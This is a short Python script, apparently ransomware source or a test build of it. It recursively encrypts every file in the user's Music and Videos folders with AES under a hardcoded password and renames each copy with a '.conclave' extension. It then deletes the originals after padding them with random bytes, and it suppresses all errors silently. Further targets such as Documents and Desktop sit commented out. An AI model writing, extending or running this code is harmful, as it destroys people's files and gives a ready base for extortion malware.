import os
import shutil
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from pathlib import Path

# Define the target directories
TARGET_DIRS = [
    #str(Path.home() / "Desktop"),
    #str(Path.home() / "Downloads"),
    #str(Path.home() / "Documents"),
    #str(Path.home() / "Pictures"),
    str(Path.home() / "Music"),
    str(Path.home() / "Videos"),
]

PASSWORD = "test123!"  # Pre-determined password
KEY = hashlib.sha256(PASSWORD.encode()).digest()  # Derive AES key

# Function to securely delete files
def secure_delete(file_path):
    try:
        with open(file_path, "ba+") as f:
            length = os.path.getsize(file_path)
            f.write(os.urandom(length))  # Overwrite with random data
        os.remove(file_path)  # Remove file after overwrite
    except Exception as e:
        pass  # Silent operation

# Encrypt file
def encrypt_file(file_path):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        cipher = AES.new(KEY, AES.MODE_CBC)
        encrypted_data = cipher.iv + cipher.encrypt(pad(data, AES.block_size))
        encrypted_file_path = file_path + ".conclave"
        with open(encrypted_file_path, "wb") as f:
            f.write(encrypted_data)
        secure_delete(file_path)  # Securely delete the original file
    except Exception as e:
        pass  # Silent failure

# Recursively encrypt all files in target directories
def encrypt_directory():
    for directory in TARGET_DIRS:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if not file_path.endswith(".conclave"):  # Avoid double encryption
                    encrypt_file(file_path)

if __name__ == "__main__":
    encrypt_directory()
